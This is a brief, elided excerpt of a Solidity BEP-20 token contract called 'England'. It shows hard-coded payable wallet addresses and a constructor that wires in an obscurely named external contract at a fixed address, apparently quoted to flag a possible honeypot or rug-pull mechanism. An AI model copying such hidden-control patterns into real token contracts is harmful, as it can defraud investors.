...
contract England is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x6F745634CE9067ce6503f81DdA92E0e2400A7299); 
    address payable public ttWal = payable(0x6F745634CE9067ce6503f81DdA92E0e2400A7299); 
    ...
    constructor (address PancakeRouterAddress) {
        ...
        _router = PancakeRouter(PancakeRouterAddress);
          hubobis = huob (0x46f3a09E72256afC5266E21637f7923773f9b5cE);
